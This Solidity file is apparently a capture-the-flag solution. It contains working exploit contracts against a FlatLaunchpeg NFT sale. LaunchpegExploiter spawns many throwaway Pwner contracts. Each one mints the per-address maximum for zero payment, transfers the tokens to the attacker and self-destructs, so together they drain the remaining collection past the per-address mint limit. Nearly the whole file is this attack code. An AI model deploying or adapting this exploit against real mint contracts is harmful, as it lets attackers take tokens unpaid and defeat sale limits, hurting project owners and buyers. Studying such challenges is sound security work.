// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";

// plan of action
// get max infos,
// loop generate new contract, mint max & transfer
// pwned.

interface IFlatLaunchpeg {
  function publicSaleMint(uint256 _quantity) external payable;
  function collectionSize() external returns (uint256);
  function maxPerAddressDuringMint() external returns (uint256);
  function transferFrom(address from, address to, uint256 tokenId) external;
  function totalSupply() external view returns (uint256);
}

contract LaunchpegExploiter {

  constructor(address _victim, address _owner){
    _pwn(_victim, _owner);
  }

  function _pwn(address _victim, address _owner) private {
    //generate victim connection 
    IFlatLaunchpeg pwnft = IFlatLaunchpeg(_victim);
    // pull pwnvars
    uint256 maxMint = pwnft.maxPerAddressDuringMint();
    uint256 t_size = pwnft.collectionSize();
    uint256 s_index = pwnft.totalSupply();
    // calculate # of loopz to prevent from gas errorz
    uint256 l_count = (t_size - s_index) / maxMint;

    for(uint256 c_index = 0; c_index < l_count; c_index ++){
      // create new contract, mint max & transfer, rinse & repeat. 
      new Pwner(pwnft, _owner, maxMint, s_index);
      s_index += maxMint;
    }

    // check for remaining
    uint256 remains = (t_size - s_index) % maxMint;
    if (remains > 0) {
      new Pwner(pwnft, _owner, remains, s_index);
    }

  }

}

contract Pwner {

  constructor(IFlatLaunchpeg _victim, address _pwner, uint256 maxMint, uint256 start) {
    _victim.publicSaleMint{value: 0}(maxMint);
    for(uint256 i = 0; i<maxMint; i++){
      _victim.transferFrom(address(this), _pwner, start + i);
    }
    selfdestruct(payable(_pwner));
  }
}
